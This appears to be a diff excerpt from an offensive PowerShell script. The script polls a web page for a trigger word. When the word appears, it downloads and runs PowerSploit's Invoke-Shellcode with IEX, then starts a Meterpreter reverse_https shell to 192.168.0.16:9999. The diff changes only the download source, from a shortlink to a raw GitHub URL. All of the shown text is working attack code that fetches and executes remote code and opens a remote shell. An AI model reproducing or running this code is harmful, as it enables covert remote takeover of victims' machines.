@@ -8,7 +8,7 @@ While($True){
 $CommentResult = $WebClientObject.DownloadString($comment)
 $Found = $CommentResult.contains($Word)
 If($Found) {
-IEX $WebClientObject.DownloadString('http://bit.ly/NHpT5c')
+IEX $WebClientObject.DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
 Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 192.168.0.16 -LPORT 9999 -Force
 Return
 }
